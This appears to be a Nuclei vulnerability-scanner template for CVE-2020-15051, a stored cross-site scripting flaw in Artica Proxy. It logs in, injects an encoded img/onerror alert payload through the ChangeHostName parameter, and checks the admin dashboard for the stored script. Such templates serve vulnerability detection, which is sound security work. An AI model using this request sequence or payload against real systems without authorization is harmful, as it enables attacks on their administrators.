id: CVE-2020-15051
info:
  name: Artica Proxy before 4.30.000000. - Cross Site Scripting
  author: TenBird
  severity: medium
  description: |
    An issue was discovered in Artica Proxy before 4.30.000000. Stored XSS exists via the Server Domain Name, Your Email Address, Group Name, MYSQL Server, Database, MYSQL Username, Group Name, and Task Description fields.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-15051
  classification:
    cve-id: CVE-2020-15051
  tags: cve,cve2020,artica,xss,authenticated

requests:
  - raw:

      - |
        POST /logon.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        artica_username={{username}}&artica_password={{password}}

      - |
        GET /system.nic.config.php?ChangeHostName=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /admin.dashboard.system.php HTTP/1.1
        Host: {{Hostname}}


    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><img src=x onerror=alert(document.domain)>'

      - type: status
        status:
          - 200
